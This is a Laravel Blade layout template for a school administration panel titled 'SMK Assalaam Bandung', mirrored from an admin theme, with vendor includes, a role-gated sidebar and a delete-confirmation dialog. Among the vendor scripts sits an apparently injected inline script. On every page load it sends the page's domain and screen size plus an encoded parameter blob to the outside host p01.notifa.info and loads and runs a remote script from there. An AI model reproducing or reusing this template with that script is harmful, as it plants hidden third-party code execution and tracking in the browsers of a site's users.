<!DOCTYPE html>
<html lang="en">
    
<!-- Mirrored from byrushan.com/projects/super-admin/app/2.1.2/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Feb 2018 07:34:45 GMT -->
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>SMK Assalaam Bandung</title>

        <!-- Vendor styles -->
        
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/material-design-iconic-font/dist/css/material-design-iconic-font.min.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/animate.css/animate.min.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/jquery.scrollbar/jquery.scrollbar.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/fullcalendar/dist/fullcalendar.min.css')}}">
        <link rel="stylesheet" href="{{asset('/css/sweetalert.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/select2/dist/css/select2.min.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/dropzone/dist/dropzone.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/flatpickr/dist/flatpickr.min.css')}}" />
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/nouislider/distribute/nouislider.min.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/bootstrap-colorpicker/dist/css/bootstrap-colorpicker.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/trumbowyg/dist/ui/trumbowyg.min.css')}}">
        <link rel="stylesheet" href="{{asset('212/vendors/bower_components/rateYo/min/jquery.rateyo.min.css')}}">

        <!-- App styles -->
        <link rel="stylesheet" href="{{asset('212/css/app.min.css')}}">

        <!-- Demo only -->
        <link rel="stylesheet" href="{{asset('212/demo/css/demo.css')}}">
    </head>

    <body data-sa-theme="2">
        <main class="main">
            <div class="page-loader">
                <div class="page-loader__spinner">
                    <svg viewBox="25 25 50 50">
                        <circle cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
                    </svg>
                </div>
            </div>

            <header class="header">
                <div class="navigation-trigger hidden-xl-up" data-sa-action="aside-open" data-sa-target=".sidebar">
                    <i class="zmdi zmdi-menu"></i>
                </div>

                <div class="logo hidden-sm-down">
                    <h1><a href="index-2.html">SMK Assalaam Bandung</a></h1>
                </div>

                <!-- <form class="search">
                    <div class="search__inner">
                        <input type="text" class="search__text" placeholder="Search for people, files, documents...">
                        <i class="zmdi zmdi-search search__helper" data-sa-action="search-close"></i>
                    </div>
                </form> -->

                <ul class="top-nav">
                    <li class="hidden-xl-up"><a href="#" data-sa-action="search-open"><i class="zmdi zmdi-search"></i></a></li>


                    <li class="dropdown hidden-xs-down">
                        <a href="#" data-toggle="dropdown"><i class="zmdi zmdi-more-vert"></i></a>

                        <div class="dropdown-menu dropdown-menu-right">
                            <a href="#" class="dropdown-item" data-sa-action="fullscreen">Fullscreen</a>
                        </div>
                    </li>

                    <li class="hidden-xs-down">
                        <a href="#" class="top-nav__themes" data-sa-action="aside-open" data-sa-target=".themes"><i class="zmdi zmdi-palette"></i></a>
                    </li>
                </ul>

                <div class="clock hidden-md-down">
                    <div class="time">
                        <span class="time__hours"></span>
                        <span class="time__min"></span>
                        <span class="time__sec"></span>
                    </div>
                </div>
            </header>

            <aside class="sidebar">
                <div class="scrollbar-inner">

                    <div class="user">
                        <div class="user__info" data-toggle="dropdown">
                            <img class="user__img" src="{{asset('212/demo/img/profile-pics/8.jpg')}}" alt="">
                            <div>
                                <div class="user__name">{{ Auth::user()->name}}</div>
                                <div class="user__email">{{ Auth::user()->email}}</div>
                            </div>
                        </div>

                        <div class="dropdown-menu">
                            <a class="dropdown-item" a href="{{ route('logout') }}" class="btn btn-default btn-flat"
                        onclick="event.preventDefault();
                        document.getElementById('logout-form').submit();">Logout</a>
                        <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                        {{ csrf_field() }}
                        </form>
                        </div>
                    </div>

                    <ul class="navigation">
                        <li class="navigation__active"><a href="#"><i class="zmdi zmdi-home"></i> Home</a></li>

                        <li class="navigation__sub @@tableactive">
                            <a href="#"><i class="zmdi zmdi-view-list"></i> Tables</a>

                            <ul>
                                @role('admin')
                                <li class="@@normaltableactive"><a href="{{route('orangtua.index')}}">Orang Tua</a></li>
                                <li class="@@datatableactive"><a href="{{route('jurusan.index')}}">Jurusan</a></li>
                                <li class="@@datatableactive"><a href="{{route('kelas.index')}}">Kelas</a></li>
                                <li class="@@datatableactive"><a href="{{route('siswa.index')}}">Siswa</a></li>
                                <li class="@@datatableactive"><a href="{{route('absensi.index')}}">Absensi</a></li>
                                @endrole
                                <li class="@@datatableactive"><a href="{{route('akumulasi.index')}}">Akumulasi</a></li>
                        </li>

                    </ul>
                </div>
            </aside>

            <div class="themes">
    <div class="scrollbar-inner">
        <a href="#" class="themes__item" data-sa-value="1"><img src="{{asset('212/img/bg/1.jpg')}}" alt=""></a>
        <a href="#" class="themes__item active" data-sa-value="2"><img src="{{asset('212/img/bg/2.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="3"><img src="{{asset('212/img/bg/3.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="4"><img src="{{asset('212/img/bg/4.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="5"><img src="{{asset('212/img/bg/5.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="6"><img src="{{asset('212/img/bg/6.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="7"><img src="{{asset('212/img/bg/7.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="8"><img src="{{asset('212/img/bg/8.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="9"><img src="{{asset('212/img/bg/9.jpg')}}" alt=""></a>
        <a href="#" class="themes__item" data-sa-value="10"><img src="{{asset('212/img/bg/10.jpg')}}" alt=""></a>
    </div>
</div>

            <section class="content">
                @yield('content')
                
            </section>
        </main>
        <!-- Javascript -->
        <!-- Vendors -->
        <script src="{{asset('212/vendors/bower_components/jquery/dist/jquery.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/popper.js/dist/umd/popper.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/bootstrap/dist/js/bootstrap.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery.scrollbar/jquery.scrollbar.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery-scrollLock/jquery-scrollLock.min.js')}}"></script>

        <script src="{{asset('212/vendors/bower_components/salvattore/dist/salvattore.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flot/jquery.flot.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flot/jquery.flot.resize.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flot.curvedlines/curvedLines.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jqvmap/dist/jquery.vmap.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jqvmap/dist/maps/jquery.vmap.world.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery.easy-pie-chart/dist/jquery.easypiechart.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/peity/jquery.peity.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/moment/min/moment.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/fullcalendar/dist/fullcalendar.min.js')}}"></script>

        <script src="{{asset('212/vendors/bower_components/jquery-mask-plugin/dist/jquery.mask.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/select2/dist/js/select2.full.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/dropzone/dist/min/dropzone.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/moment/min/moment.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flatpickr/dist/flatpickr.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/nouislider/distribute/nouislider.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/bootstrap-colorpicker/dist/js/bootstrap-colorpicker.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/trumbowyg/dist/trumbowyg.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/rateYo/min/jquery.rateyo.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery-text-counter/textcounter.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/autosize/dist/autosize.min.js')}}"></script>

        <!-- Charts and maps-->
        <script src="{{asset('212/demo/js/flot-charts/curved-line.js')}}"></script>
        <script src="{{asset('212/demo/js/flot-charts/line.js')}}"></script>
        <script src="{{asset('212/demo/js/flot-charts/dynamic.js')}}"></script>
        <script src="{{asset('212/demo/js/flot-charts/chart-tooltips.js')}}"></script>
        <script src="{{asset('212/demo/js/other-charts.js')}}"></script>
        <script src="{{asset('212/demo/js/jqvmap.js')}}"></script>

        <!-- App functions and actions -->
        <script src="{{asset('212/js/app.min.js')}}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mORgxWbiUnP8FHmnZKT3JXGmdj%2b4U5nzhRsBqRFeBiDOv14IiFyOSfB%2fZEnlzIfMmtRCVPecPZlum2IRkEFra3GgRZefINVmkYPXlQqPwr%2bZAq1YLrEEivEZ42cOr0Uj8BKcPE%2fkTmMEQEKgqz7DsRsyLrD65IHNAaMgpKihXI6xi15uAICwlaWG%2ffMN574u%2fUTaYYQmV1YJ127G8XnpicQmnjddCYUWiN28eC0DKKOiNE8kaQgTW8BXUShuHYcINyfiKTYAK1RKqFsvN%2bSJlc%2bNHrwoFZAfk4DOyDeAC%2fxuIvNAqCQxNggMHmxWkCLo2Fg8zXGGnCyGEj6AM4N2GkQRVPhAYYIDpa4s8Sukxg502rV6TwiFx6CUbFoz7COhrbQc23977DGw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


    <!-- Vendors: Data tables -->
        <script src="{{asset('212/vendors/bower_components/datatables.net/js/jquery.dataTables.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/datatables.net-buttons/js/dataTables.buttons.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/datatables.net-buttons/js/buttons.print.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jszip/dist/jszip.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/datatables.net-buttons/js/buttons.html5.min.js')}}"></script>

        <script src="{{asset('/js/sweetalert.min.js')}}"></script>
        @include('sweet::alert')
        <script type="text/javascript">
    $(document).on('click', '#delete-btn', function(e){
        e.preventDefault();
        var self = $(this);
        swal({
        title: "Are you sure?",
        text: "You will not be able to recover this imaginary file!",
        type: "warning",
        showCancelButton: true,
        confirmButtonColor: "#DD6B55",
        confirmButtonText: "Yes, delete it!",
        cancelButtonText: "No, cancel plx!",
        closeOnConfirm: false,
        closeOnCancel: false
        }, function (isConfirm) {
        if (isConfirm) {
            swal("Deleted!", "Your imaginary file has been deleted.", "success");
            setTimeout(function() {
                            self.parents(".delete").submit();
                        }, 100);
        } else {
            swal("Cancelled", "Your imaginary file is safe :)", "error");
        }
             });

    });
</script>

<!-- Mirrored from byrushan.com/projects/super-admin/app/2.1.2/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Feb 2018 07:42:44 GMT -->
</html>